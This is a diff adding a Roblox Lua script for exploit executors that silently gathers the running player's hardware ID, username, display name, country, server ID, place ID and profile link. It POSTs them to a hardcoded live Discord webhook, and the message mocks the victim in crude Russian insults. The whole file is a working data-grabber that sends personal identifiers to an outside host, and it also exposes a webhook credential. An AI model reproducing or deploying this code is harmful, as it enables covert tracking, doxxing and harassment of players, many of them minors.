@@ -1,0 +1,411 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local TeleportService = game:GetService("TeleportService")
+local LocalizationService = game:GetService("LocalizationService")
+local Webhook_URL = "https://discord.com/api/webhooks/1379905573348446278/wksUZZlCl8ildT8iEFyg5fxpbRfZCJTR8Bqotj9tVJBHpSRFlRbAD9YhkbItefSiq5ty"
+local Countries = {
+    ["BD"] = "Bangladesh",
+    ["BE"] = "Belgium",
+    ["BF"] = "Burkina Faso",
+    ["BG"] = "Bulgaria",
+    ["BA"] = "Bosnia and Herzegovina",
+    ["BB"] = "Barbados",
+    ["WF"] = "Wallis and Futuna",
+    ["BL"] = "Saint Barthelemy",
+    ["BM"] = "Bermuda",
+    ["BN"] = "Brunei",
+    ["BO"] = "Bolivia",
+    ["BH"] = "Bahrain",
+    ["BI"] = "Burundi",
+    ["BJ"] = "Benin",
+    ["BT"] = "Bhutan",
+    ["JM"] = "Jamaica",
+    ["BV"] = "Bouvet Island",
+    ["BW"] = "Botswana",
+    ["WS"] = "Samoa",
+    ["BQ"] = "Bonaire, Saint Eustatius and Saba",
+    ["BR"] = "Brazil",
+    ["BS"] = "Bahamas",
+    ["JE"] = "Jersey",
+    ["BY"] = "Belarus",
+    ["BZ"] = "Belize",
+    ["RU"] = "Russia",
+    ["RW"] = "Rwanda",
+    ["RS"] = "Serbia",
+    ["TL"] = "East Timor",
+    ["RE"] = "Reunion",
+    ["TM"] = "Turkmenistan",
+    ["TJ"] = "Tajikistan",
+    ["RO"] = "Romania",
+    ["TK"] = "Tokelau",
+    ["GW"] = "Guinea-Bissau",
+    ["GU"] = "Guam",
+    ["GT"] = "Guatemala",
+    ["GS"] = "South Georgia and the South Sandwich Islands",
+    ["GR"] = "Greece",
+    ["GQ"] = "Equatorial Guinea",
+    ["GP"] = "Guadeloupe",
+    ["JP"] = "Japan",
+    ["GY"] = "Guyana",
+    ["GG"] = "Guernsey",
+    ["GF"] = "French Guiana",
+    ["GE"] = "Georgia",
+    ["GD"] = "Grenada",
+    ["GB"] = "United Kingdom",
+    ["GA"] = "Gabon",
+    ["SV"] = "El Salvador",
+    ["GN"] = "Guinea",
+    ["GM"] = "Gambia",
+    ["GL"] = "Greenland",
+    ["GI"] = "Gibraltar",
+    ["GH"] = "Ghana",
+    ["OM"] = "Oman",
+    ["TN"] = "Tunisia",
+    ["JO"] = "Jordan",
+    ["HR"] = "Croatia",
+    ["HT"] = "Haiti",
+    ["HU"] = "Hungary",
+    ["HK"] = "Hong Kong",
+    ["HN"] = "Honduras",
+    ["HM"] = "Heard Island and McDonald Islands",
+    ["VE"] = "Venezuela",
+    ["PR"] = "Puerto Rico",
+    ["PS"] = "Palestinian Territory",
+    ["PW"] = "Palau",
+    ["PT"] = "Portugal",
+    ["SJ"] = "Svalbard and Jan Mayen",
+    ["PY"] = "Paraguay",
+    ["IQ"] = "Iraq",
+    ["PA"] = "Panama",
+    ["PF"] = "French Polynesia",
+    ["PG"] = "Papua New Guinea",
+    ["PE"] = "Peru",
+    ["PK"] = "Pakistan",
+    ["PH"] = "Philippines",
+    ["PN"] = "Pitcairn",
+    ["PL"] = "Poland",
+    ["PM"] = "Saint Pierre and Miquelon",
+    ["ZM"] = "Zambia",
+    ["EH"] = "Western Sahara",
+    ["EE"] = "Estonia",
+    ["EG"] = "Egypt",
+    ["ZA"] = "South Africa",
+    ["EC"] = "Ecuador",
+    ["IT"] = "Italy",
+    ["VN"] = "Vietnam",
+    ["SB"] = "Solomon Islands",
+    ["ET"] = "Ethiopia",
+    ["SO"] = "Somalia",
+    ["ZW"] = "Zimbabwe",
+    ["SA"] = "Saudi Arabia",
+    ["ES"] = "Spain",
+    ["ER"] = "Eritrea",
+    ["ME"] = "Montenegro",
+    ["MD"] = "Moldova",
+    ["MG"] = "Madagascar",
+    ["MF"] = "Saint Martin",
+    ["MA"] = "Morocco",
+    ["MC"] = "Monaco",
+    ["UZ"] = "Uzbekistan",
+    ["MM"] = "Myanmar",
+    ["ML"] = "Mali",
+    ["MO"] = "Macao",
+    ["MN"] = "Mongolia",
+    ["MH"] = "Marshall Islands",
+    ["MK"] = "Macedonia",
+    ["MU"] = "Mauritius",
+    ["MT"] = "Malta",
+    ["MW"] = "Malawi",
+    ["MV"] = "Maldives",
+    ["MQ"] = "Martinique",
+    ["MP"] = "Northern Mariana Islands",
+    ["MS"] = "Montserrat",
+    ["MR"] = "Mauritania",
+    ["IM"] = "Isle of Man",
+    ["UG"] = "Uganda",
+    ["TZ"] = "Tanzania",
+    ["MY"] = "Malaysia",
+    ["MX"] = "Mexico",
+    ["IL"] = "Israel",
+    ["FR"] = "France",
+    ["IO"] = "British Indian Ocean Territory",
+    ["SH"] = "Saint Helena",
+    ["FI"] = "Finland",
+    ["FJ"] = "Fiji",
+    ["FK"] = "Falkland Islands",
+    ["FM"] = "Micronesia",
+    ["FO"] = "Faroe Islands",
+    ["NI"] = "Nicaragua",
+    ["NL"] = "Netherlands",
+    ["NO"] = "Norway",
+    ["NA"] = "Namibia",
+    ["VU"] = "Vanuatu",
+    ["NC"] = "New Caledonia",
+    ["NE"] = "Niger",
+    ["NF"] = "Norfolk Island",
+    ["NG"] = "Nigeria",
+    ["NZ"] = "New Zealand",
+    ["NP"] = "Nepal",
+    ["NR"] = "Nauru",
+    ["NU"] = "Niue",
+    ["CK"] = "Cook Islands",
+    ["XK"] = "Kosovo",
+    ["CI"] = "Ivory Coast",
+    ["CH"] = "Switzerland",
+    ["CO"] = "Colombia",
+    ["CN"] = "China",
+    ["CM"] = "Cameroon",
+    ["CL"] = "Chile",
+    ["CC"] = "Cocos Islands",
+    ["CA"] = "Canada",
+    ["CG"] = "Republic of the Congo",
+    ["CF"] = "Central African Republic",
+    ["CD"] = "Democratic Republic of the Congo",
+    ["CZ"] = "Czech Republic",
+    ["CY"] = "Cyprus",
+    ["CX"] = "Christmas Island",
+    ["CR"] = "Costa Rica",
+    ["CW"] = "Curacao",
+    ["CV"] = "Cape Verde",
+    ["CU"] = "Cuba",
+    ["SZ"] = "Swaziland",
+    ["SY"] = "Syria",
+    ["SX"] = "Sint Maarten",
+    ["KG"] = "Kyrgyzstan",
+    ["KE"] = "Kenya",
+    ["SS"] = "South Sudan",
+    ["SR"] = "Suriname",
+    ["KI"] = "Kiribati",
+    ["KH"] = "Cambodia",
+    ["KN"] = "Saint Kitts and Nevis",
+    ["KM"] = "Comoros",
+    ["ST"] = "Sao Tome and Principe",
+    ["SK"] = "Slovakia",
+    ["KR"] = "South Korea",
+    ["SI"] = "Slovenia",
+    ["KP"] = "North Korea",
+    ["KW"] = "Kuwait",
+    ["SN"] = "Senegal",
+    ["SM"] = "San Marino",
+    ["SL"] = "Sierra Leone",
+    ["SC"] = "Seychelles",
+    ["KZ"] = "Kazakhstan",
+    ["KY"] = "Cayman Islands",
+    ["SG"] = "Singapore",
+    ["SE"] = "Sweden",
+    ["SD"] = "Sudan",
+    ["DO"] = "Dominican Republic",
+    ["DM"] = "Dominica",
+    ["DJ"] = "Djibouti",
+    ["DK"] = "Denmark",
+    ["VG"] = "British Virgin Islands",
+    ["DE"] = "Germany",
+    ["YE"] = "Yemen",
+    ["DZ"] = "Algeria",
+    ["US"] = "United States",
+    ["UY"] = "Uruguay",
+    ["YT"] = "Mayotte",
+    ["UM"] = "United States Minor Outlying Islands",
+    ["LB"] = "Lebanon",
+    ["LC"] = "Saint Lucia",
+    ["LA"] = "Laos",
+    ["TV"] = "Tuvalu",
+    ["TW"] = "Taiwan",
+    ["TT"] = "Trinidad and Tobago",
+    ["TR"] = "Turkey",
+    ["LK"] = "Sri Lanka",
+    ["LI"] = "Liechtenstein",
+    ["LV"] = "Latvia",
+    ["TO"] = "Tonga",
+    ["LT"] = "Lithuania",
+    ["LU"] = "Luxembourg",
+    ["LR"] = "Liberia",
+    ["LS"] = "Lesotho",
+    ["TH"] = "Thailand",
+    ["TF"] = "French Southern Territories",
+    ["TG"] = "Togo",
+    ["TD"] = "Chad",
+    ["TC"] = "Turks and Caicos Islands",
+    ["LY"] = "Libya",
+    ["VA"] = "Vatican",
+    ["VC"] = "Saint Vincent and the Grenadines",
+    ["AE"] = "United Arab Emirates",
+    ["AD"] = "Andorra",
+    ["AG"] = "Antigua and Barbuda",
+    ["AF"] = "Afghanistan",
+    ["AI"] = "Anguilla",
+    ["VI"] = "U.S. Virgin Islands",
+    ["IS"] = "Iceland",
+    ["IR"] = "Iran",
+    ["AM"] = "Armenia",
+    ["AL"] = "Albania",
+    ["AO"] = "Angola",
+    ["AQ"] = "Antarctica",
+    ["AS"] = "American Samoa",
+    ["AR"] = "Argentina",
+    ["AU"] = "Australia",
+    ["AT"] = "Austria",
+    ["AW"] = "Aruba",
+    ["IN"] = "India",
+    ["AX"] = "Aland Islands",
+    ["AZ"] = "Azerbaijan",
+    ["IE"] = "Ireland",
+    ["ID"] = "Indonesia",
+    ["UA"] = "Ukraine",
+    ["QA"] = "Qatar",
+    ["MZ"] = "Mozambique"
+}
+
+local function GetHWID()
+    local hwid = ""
+    local success, result = pcall(function()
+        return game:GetService("RbxAnalyticsService"):GetClientId()
+    end)
+    if success then
+        hwid = result
+    else
+        hwid = "Не удалось получить HWID"
+    end
+    return hwid
+end
+
+local function GetCountry()
+    local countryCode = ""
+    local countryName = "Неизвестно"
+    local countryFlag = "🏳️"
+    
+    local success, code = pcall(function()
+        return LocalizationService:GetCountryRegionForPlayerAsync(LocalPlayer)
+    end)
+    if success and code then
+        countryCode = code
+        countryName = Countries[code] or "Неизвестно"
+        if #code == 2 then
+            local firstLetter = string.byte(string.sub(code, 1, 1)) - string.byte("A") + 0x1F1E6
+            local secondLetter = string.byte(string.sub(code, 2, 2)) - string.byte("A") + 0x1F1E6
+            local firstChar = utf8.char(firstLetter)
+            local secondChar = utf8.char(secondLetter)
+            
+            countryFlag = firstChar .. secondChar
+        end
+    end
+    
+    return countryCode, countryName, countryFlag
+end
+
+local profileUrl = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile"
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+local countryCode, countryName, countryFlag = GetCountry()
+
+local data = {
+    ["content"] = "",
+    ["embeds"] = {{
+        ["title"] = "***Петушара был пойман!***",
+        ["description"] = "||" .. LocalPlayer.DisplayName .. "||" .." взял в рот.",
+        ["type"] = "rich",
+        ["color"] = tonumber(0xffffff),
+        ["fields"] = {
+            {
+                ["name"] = "HWID:",
+                ["value"] = "||" .. GetHWID() .. "||",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Имя еблана:",
+                ["value"] = "||" .. LocalPlayer.Name .. "||",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Страна:",
+                ["value"] = "||" .. countryName .. " " .. countryFlag .. " (" .. countryCode .. ")" .. "||",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "ID Сервера:",
+                ["value"] = "||" .. jobId .. "||",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "ID Игры:",
+                ["value"] = "||" .. placeId .. "||",
+                ["inline"] = true
+            },
+            {
+                ["name"] = "Профиль еблана:",
+                ["value"] = "||[Открыть профиль](" .. profileUrl .. ")||",
+                ["inline"] = true
+            }
+        }
+    }}
+}
+
+local jsonData = HttpService:JSONEncode(data)
+
+local function SendWebhook()
+    if syn and syn.request then
+        syn.request({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        
+        return true
+    end
+    
+    if request then
+        request({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        return true
+    end
+
+    if http and http.request then
+        http.request({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        return true
+    end
+
+    if electron and electron.request then
+        electron.request({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        return true
+    end
+    if http_request then
+        http_request({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = jsonData
+        })
+        return true
+    end
+    return false
+end
+local success = SendWebhook()
+return success 
